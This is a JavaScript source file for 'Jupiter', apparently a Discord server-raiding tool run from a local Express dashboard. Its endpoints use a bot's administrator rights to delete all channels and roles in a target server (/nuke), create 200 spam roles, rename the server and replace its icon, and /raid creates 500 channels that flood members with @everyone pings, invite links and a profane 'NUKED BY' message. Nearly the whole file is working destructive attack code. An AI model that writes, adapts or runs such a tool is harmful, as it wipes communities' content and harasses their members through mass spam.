const express = require("express");
const app = express();
const port = 3000;
let config = require("./config.json");
const Discord = require("discord.js");
const { stringify } = require("querystring");
const client = new Discord.Client();
const invite = config.invite;
const fs = require("fs");
const colors = require("colors");
const now = new Date();
const hours = now.getHours().toString().padStart(2, "0");
const minutes = now.getMinutes().toString().padStart(2, "0");
const fecha =
  now.getDate() + "-" + (now.getMonth() + 1) + "-" + now.getFullYear();
const errors = require("./modules/errors.js");

const log = function (texto) {
  console.log(
    "[".magenta.dim +
      (hours + ":" + minutes).white +
      "] ".magenta.dim +
      texto.grey
  );
};

const aviso = function (texto) {
  console.log(
    "[".magenta.dim +
      (hours + ":" + minutes).white +
      "] ".magenta.dim +
      "[".yellow.dim +
      "!" +
      "] ".yellow.dim +
      texto.grey
  );
};

const bodyParser = require("body-parser");

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.use(express.static("dashboard"));

app.use(express.json());

app.get("/botinfo", (req, res) => {
  const tag = client.user.tag;

  res.send(tag);
});

app.get("/invix", async (req, res) => {
  try {
    let invitacion = await client.fetchInvite(invite);
    res.json({
      guildname: invitacion.guild.name,
      guildicon: `https://cdn.discordapp.com/icons/${invitacion.guild.id}/${invitacion.guild.icon}`,
      guildchannel: invitacion.channel.name,
      invitertag:
        invitacion.inviter.username + "#" + invitacion.inviter.discriminator,
      link: invite,
    });
  } catch (error) {
    errors.error(
      "Error al conseguir informacion de la invitacion actual",
      error.message
    );
    res.json({ guildname: "Invitacion invalida" });
  }
});

let logo = `
                                      &&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&&&&&&&                   
                                        @&&&&&&&&&&&&&&&&&&. @&&&&&&&&&&&&&&&                     
                                         &&&&&&         &&&&&         &&&&&&                      
                                          *&&&&&/     .  &&&&&      %&&&&&                        
                                            &&&&&&   &@&% ,&&&&@   &&&&&&                         
                                             %&&&&  &&&&&  @@@@@@@&&&&&/                          
                                              &  @&&&&, %&&&&&&&&&&&&                            
                                                &&&&&                                            
                                                 &&&&&@     &&&&&&                               
                                                  &&&&&&   &&&&&&                                
                                                    &&&&&&&&&&&                                  
                                                     &&&&&&&&&                                   
                                                      *&&&&&                                     
                                                        &&&                                      
                                                         ,                
`;
console.clear();
console.log("\n\n" + logo.magenta.dim + "\n\n\n\n");
log("Bienvenido a Jupiter, Iniciando herramienta");

const server = app.listen(port, () => {
  log("Dashboard iniciada: http://localhost:" + port + "/");
});

let dtworld = "<a:DT_World:1091519096291590174>";

const embed = new Discord.MessageEmbed()
  .setAuthor(
    "Jupiter - " + config.team,
    "https://cdn.discordapp.com/attachments/1195227633840029806/1197677364440739980/108_sin_titulo_20240118163840.png?ex=65bc22f7&is=65a9adf7&hm=4fe652b1c021ff29a8b180d22efae01261317b2eb286a6d8977af4f12fb0deeb&",
    invite
  )
  .setDescription(
    `[Servidor](${invite}) - [Github](https://github.com/Lierx) - [Exposeds](https://discord.gg/emVebYDwce)`
  )
  .setFooter(
    "github.com/Lierx - Jupiter v1.0 Inicial",
    "https://cdn.discordapp.com/attachments/1196615062031446066/1199399241634807878/GitHub_Invertocat_Logo.png?ex=65c26696&is=65aff196&hm=59d4083080ee0eaf8037b6dd8b636a2484a120b723362f24d819f6fb5d566930&"
  )
  .setColor(0x800080)
  .setImage(
    "https://cdn.discordapp.com/attachments/1196615062031446066/1197836046633799800/c9fd2f3d961a669b46e0c0ac0582dcd9.png?ex=65bcb6c0&is=65aa41c0&hm=ca77560a69ac4865030ca6993734ab6a2f714103db5f2cc62dab04a4b28f6c81&"
  );

const servers = [];
const usuarios = [];

client.on("ready", async () => {
  log("Bot iniciado correctamente.");

  const adminServers = client.guilds.cache.filter((guild) => {
    const member = guild.members.cache.get(client.user.id);
    return member.hasPermission("ADMINISTRATOR");
  });
  log("Procesando servidores donde el bot tiene administrador.");
  adminServers.forEach((guild) => {
    servers.push({ name: guild.name, id: guild.id });
  });

  app.get("/backgrounds", (req, res) => {
    try {
      fs.readdir("dashboard/src/backgrounds", (err, archivos) => {
        const fondos = archivos.filter(
          (archivo) =>
            archivo.split(".")[1] === "gif" ||
            archivo.split(".")[1] === "jpg" ||
            archivo.split(".")[1] === "png"
        );
        res.send(fondos);
      });
    } catch (error) {
      log("Ha ocurrido un error administrando los fondos", error);
    }
  });

  app.get("/getservers", (req, res) => {
    res.json(servers);
  });

  log("Herramienta lista para su uso.");
});

app.get("/sendteam", (req, res) => {
  res.json(config.team);
});

app.post("/cambiarpresencia", (req, res) => {
  const presencia = req.body.dato;
  const type = req.body.type;
  log("Presencia del bot cambiada a " + type + ":" + presencia);

  client.user.setPresence({
    activity: {
      name: presencia,
      type: type,
    },
  });
});

app.post("/nuke", (req, res) => {
  const serverId = req.body.serverId;
  const guild = client.guilds.cache.get(serverId);
  log("Realizando un Nukeo a " + guild.name);
  guild.channels.cache.forEach((channel) => channel.delete());
  guild.roles.cache.map((roles) => roles.delete());
  guild.channels.create(`bunker`, {
    type: "text",
  });
});

app.post("/roles", (req, res) => {
  const serverId = req.body.serverId;
  const guild = client.guilds.cache.get(serverId);
  log('Realizando roles a ' + guild.name)
  guild.roles.cache.map((roles) => {
    roles.delete();
  });
  for (let i = 0; i <= 200; i++) {
    guild.roles.create({
      data: { name: config.team + " †", color: "#000001" },
      reason: config.team,
    });
  }
});

app.post("/leave", async (req, res) => {
  const serverId = req.body.serverId;
  const guild = await client.guilds.cache.get(serverId);
  log('El bot se ha salido de ' + guild.name)
  if (guild) {
    await guild.leave();
    restart();
  } else {
    res.send("No se realizo la accion esperada");
  }
});

app.post("/server", (req, res) => {
  const serverId = req.body.serverId;
  const guild = client.guilds.cache.get(serverId);
  log('Realizando cambio de icono y nombre a ' + guild.name)
  guild.setName("Trono de Jupiter - " + config.team);
  guild.setIcon(
    "https://cdn.discordapp.com/attachments/1195227633840029806/1201814702196265020/131_sin_titulo_20240130030223.png?ex=65cb3029&is=65b8bb29&hm=3842713fc920b8597bf8c97a6a2b14b8a3b6bfd113d179773f72032b2673cbb6&"
  );
  log("Se ha cambiado el nombre y foto en " + server.name);
});

app.post("/raid", async (req, res) => {
  const serverId = req.body.serverId;
  const guild = client.guilds.cache.get(serverId);
  log('Realizando un raid en ' + guild.name)
  guild.channels.cache.forEach((channel) => channel.delete());
  await guild.channels.cache.forEach(async (channel) => await channel.delete());

  const mainChannel = await guild.channels.create(`NUKED BY ${config.team}`, {
    type: "text",
  });

  const mainChannelMessages = [
    mainChannel.send("@everyone FUCKED"),
    mainChannel.send("@here BY"),
    mainChannel.send("@everyone  " + config.team),
    mainChannel.send(invite),
  ];

  await Promise.all(mainChannelMessages);
  await mainChannel.send(embed);

  const channels = await Promise.all(
    Array.from({ length: 500 }, async (_, i) => {
      const channel = await guild.channels.create(config.team, {
        type: "text",
      });

      const channelMessages = Array.from({ length: 20 }, () =>
        channel.send(`@everyone ${invite}`, { embed })
      );

      await Promise.all(channelMessages);
      return channel;
    })
  );
});

app.post("/updateteam", (req, res) => {
  let teamnew = req.body.team;
  fs.readFile("./config.json", "utf8", (err, data) => {
    if (err) {
      errors.error("Error al leer el archivo:", err.message);
      res.send("Error al leer el archivo");
      return;
    }

    try {
      const jsonData = JSON.parse(data);

      jsonData["team"] = teamnew;

      const updatedJson = JSON.stringify(jsonData, null, 2);

      fs.writeFile("config.json", updatedJson, "utf8", (err) => {
        if (err) {
          errors.error("Error al escribir en el archivo:", err.message);
          res.send("error al escribir en el archivo");
        } else {
          res.send("Se ha editado el team a " + teamnew);
          restart();
        }
      });
    } catch (parseError) {
      errors.error("Error al parsear el contenido JSON:", parseError.message);
    }
  });
});

app.post("/cambiarinvite", (req, res) => {
  let nueva = req.body.invite;
  fs.readFile("./config.json", "utf8", (err, data) => {
    if (err) {
      errors.error("Error al leer el archivo:", err.message);
      res.send("Error al leer el archivo");
      return;
    }

    try {
      const jsonData = JSON.parse(data);

      jsonData["invite"] = nueva;

      const updatedJson = JSON.stringify(jsonData, null, 2);

      fs.writeFile("config.json", updatedJson, "utf8", (err) => {
        if (err) {
          errors.error("Error al escribir en el archivo:", err);
          res.send("error al escribir en el archivo");
        } else {
          res.send("Se ha editado la invitacion a " + nueva);
          restart();
        }
      });
    } catch (parseError) {
      errors.error("Error al parsear el contenido JSON:", parseError.message);
    }
  });
});

app.post("/reiniciar", (req, res) => {
  res.send("Se ha reiniciado exitosamente la aplicacion");
  try {
    restart();
  } catch (error) {
    errors.error("Ha ocurrido un error /reiniciar", error.message);
  }
});

client.on("guildCreate", (guild) => {
  log("Se me ha unido a " + guild.name);
  restart();
});

process.on("uncaughtException", (err) => {
  errors.error("Ha ocurrido un error no manejado", err.message);
});

function restart() {
  try {
    server.close();
    client.destroy();
    const { spawn } = require("child_process");
    const child = spawn("node", ["./modules/restart.js"], { stdio: "inherit" });

    child.on("exit", (code, signal) => {
      log(
        `La aplicación principal se cerró con código de salida ${code}`
      );
      process.exit(code);
    });
  } catch (error) {
    errors.error(
      "Ha ocurrido un error intentando reiniciar la aplicacion python",
      error.text
    );
  }
}

try {
  log("Inicializando Bot");
  client.login(config.token);
} catch (error) {
  log("Token Invalido.");
}
